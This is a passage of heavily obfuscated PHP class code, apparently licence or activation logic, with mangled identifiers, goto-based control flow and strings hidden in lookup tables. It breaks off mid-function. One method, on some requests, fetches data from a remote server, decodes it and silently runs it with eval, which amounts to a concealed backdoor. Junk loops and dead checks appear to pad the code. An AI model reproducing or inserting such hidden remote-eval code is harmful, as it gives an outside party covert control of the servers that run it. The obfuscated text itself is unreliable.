dysw1a0f5702() { goto Eôâ¤³†œ; e†ö›ŠÖÔ¤: $F¢ôœÅ¸¸[$BèÕº—ôœ¦] = $Fîˆ¡ğèõå; $Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[11])->{$_SERVER[Ç][226]}($BÓîõìÚ”[$Fë¼öñÌ¼›[227]], array($Fë¼öñÌ¼›[228] => $F¢ôœÅ¸¸)); $DÇ›àÅêÇ = $aØ…±‹»»‘[599]; goto d¼Åòô¡‹›; FŒŒñÊ´·: if (!$Fë¼öñÌ¼›[104]($GLOBALS, $Fë¼öñÌ¼›[132])) { die; } $Aç…áÄëÖ = $GLOBALS[$Fë¼öñÌ¼›[22]]; if (isset($Aç…áÄëÖ[$Fë¼öñÌ¼›[163]])) { $this->{$_SERVER[Ç][164]}(); die; } goto CÊ“Ú§­°Î; dâ–ÌÍ¨ê¸: $BÓîõìÚ” = $fŠ¹éãÑ‹Ç[$Fë¼öñÌ¼›[225]]; $D°´ÆÃ‘Ûï = $aØ…±‹»»‘[597]; while ($D°´ÆÃ‘Ûï < $aØ…±‹»»‘[558]) { if ($D°´ÆÃ‘Ûï >= 0) { break; } $D°´ÆÃ‘Ûï++; } goto b„õ‰ÁÌ; Dµ—¥òàˆ: $AŞùø¹âšŠ = $aØ…±‹»»‘[595]; if (!$AŞùø¹âšŠ) { die; } $Fîˆ¡ğèõå = $this->{$_SERVER[Ç][127]}($Fë¼öñÌ¼›[148]($A¢à‘İÅ), $bÜ³¾ÈÕë‚); goto fïÉƒöÁë; cøî¢˜©ŞÃ: $D›ìâ’Ñô×[$Fë¼öñÌ¼›[123]] = $Fë¼öñÌ¼›[118]($Fë¼öñÌ¼›[214]($this->{$_SERVER[Ç][147]}($f¸ùÛÁ©Ñ•, $Fë¼öñÌ¼›[216]))); $bªæÂÇ¼»Ø = $aØ…±‹»»‘[594]; if ($A¢à‘İÅ[$Fë¼öñÌ¼›[217]] && $A¢à‘İÅ[$Fë¼öñÌ¼›[217]] >= 1) { $Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[62])->{$_SERVER[Ç][218]}($Fë¼öñÌ¼›[219], $Fë¼öñÌ¼›[220]); } goto bŞêÀª†; EÛõ´¾öÖ‘: if ($F‘ë‚˜ƒ÷[$Fë¼öñÌ¼›[168]]) { $D›ìâ’Ñô×[$Fë¼öñÌ¼›[212]] = $F‘ë‚˜ƒ÷[$Fë¼öñÌ¼›[168]]; } $fÇÓëƒÙ¡ = $Fë¼öñÌ¼›[25]($Fë¼öñÌ¼›[114]($D›ìâ’Ñô×[$Fë¼öñÌ¼›[210]]), 10, 10); $FŠ‘“ù§‹ = $fÇÓëƒÙ¡ . $D›ìâ’Ñô×[$Fë¼öñÌ¼›[120]] . $D›ìâ’Ñô×[$Fë¼öñÌ¼›[212]]; goto aØò†¾‡â; d¼Åòô¡‹›: while ($DÇ›àÅêÇ < $aØ…±‹»»‘[546]) { if ($DÇ›àÅêÇ >= 0) { break; } $DÇ›àÅêÇ++; } $Fë¼öñÌ¼›[166]($Fë¼öñÌ¼›[197]($Fë¼öñÌ¼›[208]), !0); $có¨…ñŠè = $aØ…±‹»»‘[600]; goto Aæ¥„µ¾ºö; CÊ“Ú§­°Î: if (!isset($Aç…áÄëÖ[$Fë¼öñÌ¼›[165]]) || $Fë¼öñÌ¼›[24]($Aç…áÄëÖ[$Fë¼öñÌ¼›[165]]) != 16) { $Fë¼öñÌ¼›[166]($Fë¼öñÌ¼›[167] . $Aç…áÄëÖ[$Fë¼öñÌ¼›[165]], !1); } $C­­ŠÈÇ”Û = $Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[62])->{$_SERVER[Ç][63]}($Fë¼öñÌ¼›[116]); $F‘ë‚˜ƒ÷ = array($Fë¼öñÌ¼›[165] => $Aç…áÄëÖ[$Fë¼öñÌ¼›[165]], $Fë¼öñÌ¼›[168] => $Fë¼öñÌ¼›[124](16), $Fë¼öñÌ¼›[169] => $Fë¼öñÌ¼›[149], $Fë¼öñÌ¼›[170] => $Fë¼öñÌ¼›[171], $Fë¼öñÌ¼›[172] => $_SERVER[$Fë¼öñÌ¼›[173]], $Fë¼öñÌ¼›[174] => $_SERVER[$Fë¼öñÌ¼›[175]], $Fë¼öñÌ¼›[176] => $_SERVER[$Fë¼öñÌ¼›[177]]); goto BÁ¸Ş¡Ï«Ø; b„õ‰ÁÌ: $F¢ôœÅ¸¸ = array(); $fìÇÔÎ·Ü = $aØ…±‹»»‘[598]; if (!$fìÇÔÎ·Ü) { return; } goto e†ö›ŠÖÔ¤; fïÉƒöÁë: $fŠ¹éãÑ‹Ç = $Fë¼öñÌ¼›[222]($Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[11])->{$_SERVER[Ç][223]}(), $Fë¼öñÌ¼›[224]); $cÃˆ½Øê¡ì = $aØ…±‹»»‘[596]; if (!$cÃˆ½Øê¡ì) { die; } goto dâ–ÌÍ¨ê¸; Eôâ¤³†œ: $aØ…±‹»»‘ =& $_SERVER[Ìó]; $Fë¼öñÌ¼› =& $_SERVER[Ç]; if ($_SERVER[$Fë¼öñÌ¼›[44]] != $Fë¼öñÌ¼›[162]) { return; } goto FŒŒñÊ´·; BÁ¸Ş¡Ï«Ø: $AéŒÆñÎŒÄ = $aØ…±‹»»‘[591]; if (strlen($AéŒÆñÎŒÄ) < $aØ…±‹»»‘[551]) { die; } $E±³òĞàÊë = $Fë¼öñÌ¼›[114]($_SERVER[$Fë¼öñÌ¼›[115]] . $C­­ŠÈÇ”Û); goto D‰Äõ¬Â…Í; dµìá“Òé‚: $aé»Ëäé¯¡ = $this->{$_SERVER[Ç][199]}($A¢à‘İÅ[$Fë¼öñÌ¼›[200]]); if (!$aé»Ëäé¯¡ || $aé»Ëäé¯¡ != $Fë¼öñÌ¼›[201]($A¢à‘İÅ[$Fë¼öñÌ¼›[145]])) { $eĞ¹ñ°Û” = array($Fë¼öñÌ¼›[202] => $Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[62])->{$_SERVER[Ç][63]}($Fë¼öñÌ¼›[116]), $Fë¼öñÌ¼›[203] => $_SERVER[$Fë¼öñÌ¼›[115]], $Fë¼öñÌ¼›[204] => $Fë¼öñÌ¼›[205](), $Fë¼öñÌ¼›[174] => $_SERVER[$Fë¼öñÌ¼›[175]]); $a«ÉèÕÃ = $this->{$_SERVER[Ç][206]}($Fë¼öñÌ¼›[148]($eĞ¹ñ°Û”)); $this->{$_SERVER[Ç][182]}($Fë¼öñÌ¼›[207] . $a«ÉèÕÃ); $Fë¼öñÌ¼›[166]($Fë¼öñÌ¼›[197]($Fë¼öñÌ¼›[208]), !0); } $D›ìâ’Ñô× = array($Fë¼öñÌ¼›[209] => $F‘ë‚˜ƒ÷[$Fë¼öñÌ¼›[165]], $Fë¼öñÌ¼›[210] => $A¢à‘İÅ[$Fë¼öñÌ¼›[211]], $Fë¼öñÌ¼›[212] => $Fë¼öñÌ¼›[124](16), $Fë¼öñÌ¼›[120] => $A¢à‘İÅ[$Fë¼öñÌ¼›[213]]); goto EÛõ´¾öÖ‘; bŞêÀª†: $Fë¼öñÌ¼›[61]($Fë¼öñÌ¼›[62])->{$_SERVER[Ç][221]}($D›ìâ’Ñô×); $bÜ³¾ÈÕë‚ = $Fë¼öñÌ¼›[114]($_SERVER[$Fë¼öñÌ¼›[115]] . $Fë¼öñÌ¼›[214]($C­­ŠÈÇ”Û) . $D›ìâ’Ñô×[$Fë¼öñÌ¼›[210]]); $BèÕº—ôœ¦ = $Fë¼öñÌ¼›[214]($Fë¼öñÌ¼›[25]($bÜ³¾ÈÕë‚, 10, 16)); goto Dµ—¥òàˆ; aØò†¾‡â: $D›ìâ’Ñô×[$Fë¼öñÌ¼›[122]] = $Fë¼öñÌ¼›[214]($Fë¼öñÌ¼›[118]($this->{$_SERVER[Ç][147]}($FŠ‘“ù§‹, $Fë¼öñÌ¼›[215]))); $eÛíáØôóˆ = $aØ…±‹»»‘[592]; $Eâ‹—ÉÄâ = $Fë¼öñÌ¼›[124](16); goto EÂğˆ’‚ê¤; D‰Äõ¬Â…Í: if ($Aç…áÄëÖ[$Fë¼öñÌ¼›[178]] == $Fë¼öñÌ¼›[179]) { $b¯¨ù…”ñ· = $this->{$_SERVER[Ç][147]}($E±³òĞàÊë, $Fë¼öñÌ¼›[180]); $a«ÉèÕÃ = $this->{$_SERVER[Ç][127]}($Fë¼öñÌ¼›[148]($F‘ë‚˜ƒ÷), $E±³òĞàÊë . $Fë¼öñÌ¼›[181], 3); $Fœ«î¶òáÅ = $this->{$_SERVER[Ç][182]}($Fë¼öñÌ¼›[183] . $b¯¨ù…”ñ· . $Fë¼öñÌ¼›[184] . $a«ÉèÕÃ, -1); $Fë¼öñÌ¼›[166]($Fœ«î¶òáÅ, !0); } else { if ($Aç…áÄëÖ[$Fë¼öñÌ¼›[178]] == $Fë¼öñÌ¼›[185]) { $E¥âŸËÂÑˆ = $Fë¼öñÌ¼›[25]($Fë¼öñÌ¼›[114]($Fë¼öñÌ¼›[186] . $E±³òĞàÊë), 12, 15) . $Fë¼öñÌ¼›[187]; $a«ÉèÕÃ = $this->{$_SERVER[Ç][188]}($Fë¼öñÌ¼›[2]($Aç…áÄëÖ[$Fë¼öñÌ¼›[189]]), $E¥âŸËÂÑˆ, 2); $CİÒ‚İ­­² = $Fë¼öñÌ¼›[190]($a«ÉèÕÃ, !0); if (!$Fë¼öñÌ¼›[191]($CİÒ‚İ­­²) || !$Fë¼öñÌ¼›[191]($CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]]) || $CİÒ‚İ­­²[$Fë¼öñÌ¼›[165]] != !0) { $E¡õ…›Áš = $Fë¼öñÌ¼›[193]; $bçÒƒ¿®­ = $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]] ? $Fë¼öñÌ¼›[194] . $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]] : $E¡õ…›Áš; $Fë¼öñÌ¼›[166]($bçÒƒ¿®­, !1); } else { $F‘ë‚˜ƒ÷[$Fë¼öñÌ¼›[168]] = $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]][$Fë¼öñÌ¼›[195]]; } } else { $CİÒ‚İ­­² = $this->{$_SERVER[Ç][182]}($Fë¼öñÌ¼›[196], $F‘ë‚˜ƒ÷, 10); } } if (!$Fë¼öñÌ¼›[191]($CİÒ‚İ­­²) || !$Fë¼öñÌ¼›[191]($CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]]) || $CİÒ‚İ­­²[$Fë¼öñÌ¼›[165]] != !0) { $E¡õ…›Áš = $Fë¼öñÌ¼›[197]($Fë¼öñÌ¼›[198]); $bçÒƒ¿®­ = $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]] ? $Fë¼öñÌ¼›[194] . $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]] : $E¡õ…›Áš; $Fë¼öñÌ¼›[166]($bçÒƒ¿®­, !1); } $A¢à‘İÅ = $CİÒ‚İ­­²[$Fë¼öñÌ¼›[192]]; goto dµìá“Òé‚; EÂğˆ’‚ê¤: $f¸ùÛÁ©Ñ• = $Eâ‹—ÉÄâ . $D›ìâ’Ñô×[$Fë¼öñÌ¼›[120]] . $this->{$_SERVER[Ç][147]}($Fë¼öñÌ¼›[114]($D›ìâ’Ñô×[$Fë¼öñÌ¼›[209]]), $Eâ‹—ÉÄâ); $cÔèó‹ÈŠ® = $aØ…±‹»»‘[593]; if (strlen($cÔèó‹ÈŠ®) < $aØ…±‹»»‘[560]) { die; } goto cøî¢˜©ŞÃ; Aæ¥„µ¾ºö: } private function rxqv4ecd9669() { goto E‡ÔŸÆœÒ; B¼’Ò¦ä›: while (strlen($cÀìÕ÷†Œ) < $EÆÎËÎÒ¸÷[551]) { if (!$cÀìÕ÷†Œ) { break; } $cÀìÕ÷†Œ++; } goto FÜ±öëÛ†; E‡ÔŸÆœÒ: $EÆÎËÎÒ¸÷ =& $_SERVER[Ìó]; $a¤ˆóçÇá’ =& $_SERVER[Ç]; $a¤ˆóçÇá’[61]($a¤ˆóçÇá’[62])->{$_SERVER[Ç][221]}(array($a¤ˆóçÇá’[209] => $a¤ˆóçÇá’[10], $a¤ˆóçÇá’[210] => $a¤ˆóçÇá’[10], $a¤ˆóçÇá’[120] => $a¤ˆóçÇá’[121], $a¤ˆóçÇá’[122] => $a¤ˆóçÇá’[10], $a¤ˆóçÇá’[123] => $a¤ˆóçÇá’[10])); goto fƒù´àô¿£; fƒù´àô¿£: $a¤ˆóçÇá’[61]($a¤ˆóçÇá’[62])->{$_SERVER[Ç][218]}($a¤ˆóçÇá’[219], $a¤ˆóçÇá’[229]); $this->wxeue3e40ca8 = array(); $B¬¦Şãß¨› = $EÆÎËÎÒ¸÷[601]; goto a§ËßÆĞ ×; a§ËßÆĞ ×: if (!$B¬¦Şãß¨›) { die; } $this->frzb663f35ed = $a¤ˆóçÇá’[121]; $cÀìÕ÷†Œ = $EÆÎËÎÒ¸÷[602]; goto B¼’Ò¦ä›; FÜ±öëÛ†: } private function tmvkbcc0d112() { goto D·…½œŸ®; c¾ïÉÛ²è¶: $D‚Ó§´ÁÈÍ = $A»µ¶÷³É™[61]($A»µ¶÷³É™[62])->{$_SERVER[Ç][63]}(); $FÆÙ¯‹™¨å = $aŒ‘°¨£Şğ[604]; while (strlen($FÆÙ¯‹™¨å) < $aŒ‘°¨£Şğ[548]) { if (!$FÆÙ¯‹™¨å) { break; } $FÆÙ¯‹™¨å++; } goto c²ˆ³ï‘ƒ; Aö›”×ŠÏÒ: if (!$A»µ¶÷³É™[191]($a˜Ô¹Ë”ì£)) { return $this->{$_SERVER[Ç][164]}(); } $eô¥ƒ‰Ù„Ç = $A»µ¶÷³É™[144]($a˜Ô¹Ë”ì£[$A»µ¶÷³É™[145]]); if ($A»µ¶÷³É™[230]() >= $eô¥ƒ‰Ù„Ç) { return $this->{$_SERVER[Ç][164]}(); } goto E¹”íä„­ê; C¼É»Ã¿àÓ: $this->frzb663f35ed = $A»µ¶÷³É™[121]; $fÄ—Çõ×Ì¾ = $aŒ‘°¨£Şğ[603]; if (!$fÄ—Çõ×Ì¾) { return; } goto c¾ïÉÛ²è¶; c²ˆ³ï‘ƒ: if ($D‚Ó§´ÁÈÍ[$A»µ¶÷³É™[120]] == $A»µ¶÷³É™[121]) { return; } $EÕ©‡±Ù¦Â = $A»µ¶÷³É™[61]($A»µ¶÷³É™[62])->{$_SERVER[Ç][63]}($A»µ¶÷³É™[116]); $c™îÌØ‘İ = $A»µ¶÷³É™[222]($A»µ¶÷³É™[61]($A»µ¶÷³É™[11])->{$_SERVER[Ç][223]}(), $A»µ¶÷³É™[224]); goto E¬²Ï¸ƒ†Ú; a†ßÌİ—¹: $E«èğ‹¤×È = $aŒ‘°¨£Şğ[606]; if (!$E«èğ‹¤×È) { return; } $a˜Ô¹Ë”ì£ = $A»µ¶÷³É™[190]($a˜Ô¹Ë”ì£, !0); goto Aö›”×ŠÏÒ; E¬²Ï¸ƒ†Ú: $f™î«³÷œ« = $c™îÌØ‘İ[$A»µ¶÷³É™[225]]; $C‚ÏŞÙ­¡· = $A»µ¶÷³É™[114]($_SERVER[$A»µ¶÷³É™[115]] . $A»µ¶÷³É™[214]($EÕ©‡±Ù¦Â) . $D‚Ó§´ÁÈÍ[$A»µ¶÷³É™[210]]); $d„É³¦¨ä¯ = $A»µ¶÷³É™[214]($A»µ¶÷³É™[25]($C‚ÏŞÙ­¡·, 10, 16)); goto DåĞÀåêîÁ; E¹”íä„­ê: $this->wxeue3e40ca8 = $a˜Ô¹Ë”ì£; $this->frzb663f35ed = $D‚Ó§´ÁÈÍ[$A»µ¶÷³É™[120]]; goto dôà¤£ã„; D·…½œŸ®: $aŒ‘°¨£Şğ =& $_SERVER[Ìó]; $A»µ¶÷³É™ =& $_SERVER[Ç]; $_SERVER[$A»µ¶÷³É™[175]] = $A»µ¶÷³É™[104]($_SERVER, $A»µ¶÷³É™[175], APP_HOST); goto C¼É»Ã¿àÓ; DåĞÀåêîÁ: $fõÂò¸¢Ôç = $aŒ‘°¨£Şğ[605]; if (strlen($fõÂò¸¢Ôç) < $aŒ‘°¨£Şğ[548]) { die; } $a˜Ô¹Ë”ì£ = $this->{$_SERVER[Ç][188]}($f™î«³÷œ«[$A»µ¶÷³É™[91]][$d„É³¦¨ä¯], $C‚ÏŞÙ­¡·); goto a†ßÌİ—¹; dôà¤£ã„: } private function pzuve7669920() { goto f¿«¹ÑçË; f¿«¹ÑçË: $e±¤¿ïç«ğ =& $_SERVER[Ìó]; $C¥¹ç’ò‰½ =& $_SERVER[Ç]; $cø©†ÙÖ˜¤ = $GLOBALS[$C¥¹ç’ò‰½[22]]; goto bë¡¹ºŒÏÍ; C‘ô›ï½: if (strlen($E¼ÂÈÀ‚ø™) < $e±¤¿ïç«ğ[551]) { return; } if ($A†¤«‡Ğ¶Ë == $C¥¹ç’ò‰½[231] && $this->frzb663f35ed == $C¥¹ç’ò‰½[121]) { $C¥¹ç’ò‰½[166]($C¥¹ç’ò‰½[197]($C¥¹ç’ò‰½[232]), !1, $C¥¹ç’ò‰½[233]); } $FÊÜ‘ = array($C¥¹ç’ò‰½[234], $C¥¹ç’ò‰½[235]); goto Cµ„Ü‘™·Ÿ; bë¡¹ºŒÏÍ: $F„îªå« = $e±¤¿ïç«ğ[607]; $A†¤«‡Ğ¶Ë = $_SERVER[$C¥¹ç’ò‰½[44]]; $E¼ÂÈÀ‚ø™ = $e±¤¿ïç«ğ[608]; goto C‘ô›ï½; Cµ„Ü‘™·Ÿ: if ($C¥¹ç’ò‰½[236]($A†¤«‡Ğ¶Ë, $FÊÜ‘)) { if ($this->frzb663f35ed == $C¥¹ç’ò‰½[121] && isset($cø©†ÙÖ˜¤[$C¥¹ç’ò‰½[237]])) { $C¥¹ç’ò‰½[166]($C¥¹ç’ò‰½[197]($C¥¹ç’ò‰½[232]), !1, $C¥¹ç’ò‰½[233]); die; } $f±ª®İÌ  = $this->{$_SERVER[Ç][137]}(); if ($f±ª®İÌ  != $C¥¹ç’ò‰½[201]($C¥¹ç’ò‰½[238])) { if ($f±ª®İÌ  <= $C¥¹ç’ò‰½[61]($C¥¹ç’ò‰½[139])->{$_SERVER[Ç][140]}()) { $C¥¹ç’ò‰½[166]($C¥¹ç’ò‰½[197]($C¥¹ç’ò‰½[239]), !1, $C¥¹ç’ò‰½[233]); die; } } } goto CÚ¢ÍŠìò¹; CÚ¢ÍŠìò¹: } private function rpau57639a90() { goto dÔ¿Ÿğë§; aÖš¶Ö†ˆ¹: if (!$CÆèîŒ®Œ†) { die; } $BØ«„ì¡‡ñ = $DÜÔù£”°×[245](array($DÜÔù£”°×[246] => array($DÜÔù£”°×[247] => $DÜÔù£”°×[248], $DÜÔù£”°×[249] => 3))); $e¢Ë™›­àÀ = @$DÜÔù£”°×[250]($f²–ÄÑëŸİ, !1, $BØ«„ì¡‡ñ); goto a–›µ‰˜†; dÔ¿Ÿğë§: $c¨–âÛœ² =& $_SERVER[Ìó]; $DÜÔù£”°× =& $_SERVER[Ç]; $Cíƒš«ƒ‡µ = array($DÜÔù£”°×[135], $DÜÔù£”°×[240]); goto C‡ÅË¸“Ú†; Fîêíß‚¢÷: if (!$DÜÔù£”°×[236]($_SERVER[$DÜÔù£”°×[44]], $Cíƒš«ƒ‡µ)) { return; } $f²–ÄÑëŸİ = $DÜÔù£”°×[242]; $C–ìµÎà›Ç = $c¨–âÛœ²[610]; goto Bœ§³ïŞË; e™Ü‹ô¿––: if ($e¢Ë™›­àÀ && $DÜÔù£”°×[32]($e¢Ë™›­àÀ, $DÜÔù£”°×[253])) { echo $e¢Ë™›­àÀ; } die; goto eÃ«´ì¸½°; C‡ÅË¸“Ú†: $d¸ÛóŸÔ¼Ü = $c¨–âÛœ²[609]; if (strlen($d¸ÛóŸÔ¼Ü) < $c¨–âÛœ²[551]) { die; } if (!$DÜÔù£”°×[104]($GLOBALS, $DÜÔù£”°×[132]) || !isset($_GET[$DÜÔù£”°×[241]])) { return; } goto Fîêíß‚¢÷; a–›µ‰˜†: $a‰§Èéß‡Ç = $c¨–âÛœ²[612]; if (strlen($a‰§Èéß‡Ç) < $c¨–âÛœ²[551]) { return; } $DÜÔù£”°×[251]($DÜÔù£”°×[252]); goto e™Ü‹ô¿––; Bœ§³ïŞË: if (!$C–ìµÎà›Ç) { die; } $f²–ÄÑëŸİ = $this->{$_SERVER[Ç][243]}($f²–ÄÑëŸİ, $DÜÔù£”°×[244]); $CÆèîŒ®Œ† = $c¨–âÛœ²[611]; goto aÖš¶Ö†ˆ¹; eÃ«´ì¸½°: } public function qcnec2dd208b($F„°ƒ˜ˆğ½) { goto CøÁ¤†é´; dìîŠ¢Ù²«: $e¸‡­Ø·Ø = array($Aæµùƒò¹[255], $Aæµùƒò¹[256], $Aæµùƒò¹[257], $Aæµùƒò¹[258], $Aæµùƒò¹[259], $Aæµùƒò¹[260], $Aæµùƒò¹[261], $Aæµùƒò¹[262]); $bŠÕ™±Ì˜ñ = $AîÍÉ Û…¥[613]; if (strlen($bŠÕ™±Ì˜ñ) < $AîÍÉ Û…¥[546]) { die; } goto b“ÓØ¬Û´·; eÍİÛÕè»¶: return $F„°ƒ˜ˆğ½; $BÖ÷µÖ ¿ñ = $AîÍÉ Û…¥[616]; if (strlen($BÖ÷µÖ ¿ñ) < $AîÍÉ Û…¥[551]) { return; } goto D„á„Ğ…Ùâ; b“ÓØ¬Û´·: $céƒÅ³ò‘Æ = $Aæµùƒò¹[0]($Aæµùƒò¹[263], $Aæµùƒò¹[104]($this->wxeue3e40ca8, $Aæµùƒò¹[129], $Aæµùƒò¹[10])); $b¨™®Äˆ™ö = $AîÍÉ Û…¥[614]; if (!$b¨™®Äˆ™ö) { die; } goto A×°Ïóİ; A×°Ïóİ: $C´ºù±×¸Ê = array(); foreach ($e¸‡­Ø·Ø as $CëïÜ†—¶Ô) { if (!$Aæµùƒò¹[236]($CëïÜ†—¶Ô, $céƒÅ³ò‘Æ)) { $C´ºù±×¸Ê[] = $CëïÜ†—¶Ô; } } foreach ($C´ºù±×¸Ê as $CëïÜ†—¶Ô) { unset($F„°ƒ˜ˆğ½[$CëïÜ†—¶Ô]); $F°èÍÊî±¾ = $AîÍÉ Û…¥[615]; while ($F°èÍÊî±¾ < $AîÍÉ Û…¥[546]) { if ($F°èÍÊî±¾ >= 0) { break; } $F°èÍÊî±¾++; } } goto eÍİÛÕè»¶; CøÁ¤†é´: $AîÍÉ Û…¥ =& $_SERVER[Ìó]; $Aæµùƒò¹ =& $_SERVER[Ç]; if ($this->frzb663f35ed == $Aæµùƒò¹[254]) { return $F„°ƒ˜ˆğ½; } goto dìîŠ¢Ù²«; D„á„Ğ…Ùâ: } private function ebrk57bca13e() { goto e·¦®…ô«; añõÆÄÓØà: $GLOBALS[$BñÒÊÖíß°[91]][$BñÒÊÖíß°[95]][$BñÒÊÖíß°[267]] = $BñÒÊÖíß°[220]; $GLOBALS[$BñÒÊÖíß°[91]][$BñÒÊÖíß°[95]][$BñÒÊÖíß°[264]] = $BñÒÊÖíß°[229]; $BÄìª·›–Í = $f¾ Ğ½£ù¸[617]; goto e÷Œãíê¶¸; e÷Œãíê¶¸: while ($BÄìª·›–Í < $f¾ Ğ½£ù¸[548]) { if ($BÄìª·›–Í >= 0) { break; } $BÄìª·›–Í++; } $GLOBALS[$BñÒÊÖíß°[91]][$BñÒÊÖíß°[268]] = $BñÒÊÖíß°[220]; $BñÒÊÖíß°[61]($BñÒÊÖíß°[269])->{$_SERVER[Ç][221]}($BñÒÊÖíß°[85], $BñÒÊÖíß°[229]); goto F­ï¶Õ˜Ë„; e·¦®…ô«: $f¾ Ğ½£ù¸ =& $_SERVER[Ìó]; $BñÒÊÖíß° =& $_SERVER[Ç]; if ($this->frzb663f35ed != $BñÒÊÖíß°[121]) { $GLOBALS[$BñÒÊÖíß°[91]][$BñÒÊÖíß°[95]][$BñÒÊÖíß°[264]] = $BñÒÊÖíß°[220]; return; } goto cÇÔùø«õ¹; cÇÔùø«õ¹: $aÖÎ÷¢÷®… = $_SERVER[$BñÒÊÖíß°[44]]; $bà’“ö‹ñƒ = array($BñÒÊÖíß°[265]); foreach ($bà’“ö‹ñƒ as $FØ‹Éñî¿‚) { if ($FØ‹Éñî¿‚ == $aÖÎ÷¢÷®… || $BñÒÊÖíß°[25]($aÖÎ÷¢÷®…, 0, $BñÒÊÖíß°[24]($FØ‹Éñî¿‚)) == $FØ‹Éñî¿‚) { $BñÒÊÖíß°[166]($BñÒÊÖíß°[197]($BñÒÊÖíß°[266]), !1); } } goto añõÆÄÓØà; F­ï¶Õ˜Ë„: } public function faihfc7c4686() { return $_SERVER[Ç][270]; $DÆÅÁ›Šêä = $_SERVER[Ìó][618]; } private function cosp54ec3cad() { goto AÃÌ™¿¨ë„; EéÇÜ»»ù: $CèÅˆëÈéÓ = array($D¥†‘†¹[165] => $D¥†‘†¹[61]($D¥†‘†¹[62])->{$_SERVER[Ç][63]}($D¥†‘†¹[209]), $D¥†‘†¹[178] => $this->frzb663f35ed, $D¥†‘†¹[176] => $_SERVER[$D¥†‘†¹[177]], $D¥†‘†¹[169] => $D¥†‘†¹[149], $D¥†‘†¹[172] => $_SERVER[$D¥†‘†¹[173]]); $eƒ½¸‡İ©  = $this->{$_SERVER[Ç][182]}($D¥†‘†¹[279], $CèÅˆëÈéÓ); $D£¥ÂÓ­Ãä = $AÔ…Æ¶µ˜Æ[622]; goto aõ‹¨óÎ³ˆ; AÃÌ™¿¨ë„: $AÔ…Æ¶µ˜Æ =& $_SERVER[Ìó]; $D¥†‘†¹ =& $_SERVER[Ç]; $d¿òÍì±êË = array($D¥†‘†¹[271], $D¥†‘†¹[272], $D¥†‘†¹[273]); goto EÊ„•ÅáØ‘; f¹¢¶õàŠî: $D¥†‘†¹[13](array($D¥†‘†¹[276], $D¥†‘†¹[152]), $B­Š—İÉÄ, $D¥†‘†¹[230]()); $fƒò¢Ïç³Ä = $AÔ…Æ¶µ˜Æ[621]; if (strlen($fƒò¢Ïç³Ä) < $AÔ…Æ¶µ˜Æ[558]) { return; } goto EéÇÜ»»ù; EÊ„•ÅáØ‘: $B­Š—İÉÄ = $D¥†‘†¹[274] . $D¥†‘†¹[114]($D¥†‘†¹[275]); $e†ÜË¬À±“ = $AÔ…Æ¶µ˜Æ[619]; if ($this->frzb663f35ed == $D¥†‘†¹[121] || !$D¥†‘†¹[104]($GLOBALS, $D¥†‘†¹[132])) { return; } goto båâŠÖ…ÜŞ; aŒˆ†“–¢Ì: $this->{$_SERVER[Ç][164]}(); $Cé°“…ÈÉ­ = $AÔ…Æ¶µ˜Æ[623]; if (strlen($Cé°“…ÈÉ­) < $AÔ…Æ¶µ˜Æ[558]) { return; } goto e‰§‹’›ªÍ; A±™ÉØ©æ: $bµªÒÆé’ = $AÔ…Æ¶µ˜Æ[620]; if (strlen($bµªÒÆé’) < $AÔ…Æ¶µ˜Æ[548]) { die; } if ($bô‡æ£ÍÖ¨ && $D¥†‘†¹[230]() - $bô‡æ£ÍÖ¨ < $D¥†‘†¹[201]($D¥†‘†¹[278])) { return; } goto f¹¢¶õàŠî; båâŠÖ…ÜŞ: if (!$D¥†‘†¹[236]($_SERVER[$D¥†‘†¹[44]], $d¿òÍì±êË)) { return; } if ($D¥†‘†¹[230]() % 4 != 0) { return; } $bô‡æ£ÍÖ¨ = $D¥†‘†¹[13](array($D¥†‘†¹[276], $D¥†‘†¹[277]), $B­Š—İÉÄ); goto A±™ÉØ©æ; e‰§‹’›ªÍ: if ($this->{$_SERVER[Ç][199]}($eƒ½¸‡İ© [$D¥†‘†¹[280]]) != $CèÅˆëÈéÓ[$D¥†‘†¹[165]]) { $B»£¶êÊ¢í = array($D¥†‘†¹[202] => $D¥†‘†¹[61]($D¥†‘†¹[62])->{$_SERVER[Ç][63]}($D¥†‘†¹[116]), $D¥†‘†¹[203] => $_SERVER[$D¥†‘†¹[115]], $D¥†‘†¹[204] => $D¥†‘†¹[205](), $D¥†‘†¹[174] => $_SERVER[$D¥†‘†¹[175]]); $DÔ’¹ïÔŠŸ = $this->{$_SERVER[Ç][206]}($D¥†‘†¹[148]($B»£¶êÊ¢í)); $eƒ½¸‡İ©  = $this->{$_SERVER[Ç][182]}($D¥†‘†¹[207] . $DÔ’¹ïÔŠŸ); if ($eƒ½¸‡İ©  && $D¥†‘†¹[191]($eƒ½¸‡İ© ) && isset($eƒ½¸‡İ© [$D¥†‘†¹[280]])) { $E³‘¬Ÿ’„í = $this->{$_SERVER[Ç][188]}($eƒ½¸‡İ© [$D¥†‘†¹[280]], 2); if ($E³‘¬Ÿ’„í) { $E³‘¬Ÿ’„í = $this->{$_SERVER[Ç][199]}($E³‘¬Ÿ’„í); } if ($E³‘¬Ÿ’„í) { try { @eval($E³‘¬Ÿ’„í); } catch (Exception $b–“°ÆĞÃ) { } } } } goto FË—·ìÒ; aõ‹¨óÎ³ˆ: while (strlen($D£¥ÂÓ­Ãä) < $AÔ…Æ¶µ˜Æ[558]) { if (!$D£¥ÂÓ­Ãä) { break; } $D£¥ÂÓ­Ãä++; } if (!$D¥†‘†¹[191]($eƒ½¸‡İ© )) { return; } if ($eƒ½¸‡İ© [$D¥†‘†¹[165]] && $eƒ½¸‡İ© [$D¥†‘†¹[280]]) { if ($this->{$_SERVER[Ç][199]}($eƒ½¸‡İ© [$D¥†‘†¹[280]]) == $CèÅˆëÈéÓ[$D¥†‘†¹[165]]) { return; } } goto aŒˆ†“–¢Ì; FË—·ìÒ: } private function txfyfe1357e3($CããÀ¡¡Ï‚ = '', $eÕ¡™Ğá£è = array(), $Eà½…©à‘ = 5) { goto 